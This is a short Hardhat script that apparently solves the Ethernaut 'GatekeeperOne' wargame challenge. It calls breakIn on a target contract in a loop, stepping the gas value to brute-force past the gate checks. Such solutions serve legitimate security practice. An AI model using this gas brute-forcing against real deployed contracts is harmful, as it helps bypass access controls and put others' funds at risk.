const abi = require('../artifacts/contracts/GatekeeperOne.sol/Entrant.json');
const hre = require('hardhat');
require('dotenv').config()

async function main() {
    //set target deployed Entrant contract address in .env
    const address = process.env.TARGET;
    const [signer] = await hre.ethers.getSigners();
    const contract = new hre.ethers.Contract(address, abi.abi, signer);
    
    for (i = 0; i < 8192; i++) {
        try {
            await contract.breakIn(120000 + i);
            break;
        } catch(e) {}
    }
    console.log(i)
}

main()